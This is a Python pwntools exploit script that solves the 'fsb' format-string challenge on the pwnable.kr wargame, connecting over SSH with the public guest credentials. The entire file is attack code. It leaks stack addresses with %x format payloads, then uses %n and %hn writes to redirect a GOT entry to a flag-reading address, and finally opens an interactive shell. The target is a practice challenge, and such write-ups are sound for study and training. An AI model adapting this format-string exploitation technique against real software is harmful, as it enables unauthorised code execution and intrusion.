#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]

if argv[1] == 'l':
	io = process('./fsb')
else:
	io = ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')

def DEBUG():

	gdb.attach(io,"b *0x08048608\nc")

def leak_esp():

	payload = "+%14$x+"
	io.sendline(payload)
	io.recvuntil('+')
	esp = int(io.recvuntil('+')[:-1],16)-0x50

	return esp

def leak_ebp_main():

	payload = "+%18$x+"
	io.sendline(payload)
	io.recvuntil('+')
	ebp_main = int(io.recvuntil('+')[:-1],16)

	return ebp_main

def ebp_main_to_got():

	got_addr = 0x0804A008 

	payload = "%{}c%18$n".format(got_addr)
	io.sendline(payload)

def sleep_to_flag(offset):

	flag_addr = 0x080486AB
	payload = "%{}c%{}$hn".format(flag_addr&0xffff,offset)
	io.sendline(payload)

if __name__ == '__main__':

	esp = leak_esp()
	print hex(esp)
	pause()

	ebp_main = leak_ebp_main()
	print hex(ebp_main)
	pause()

	ebp_main_to_got()
	pause()

	offset = (ebp_main-esp)/4
	sleep_to_flag(offset)
	pause()

	io.interactive()


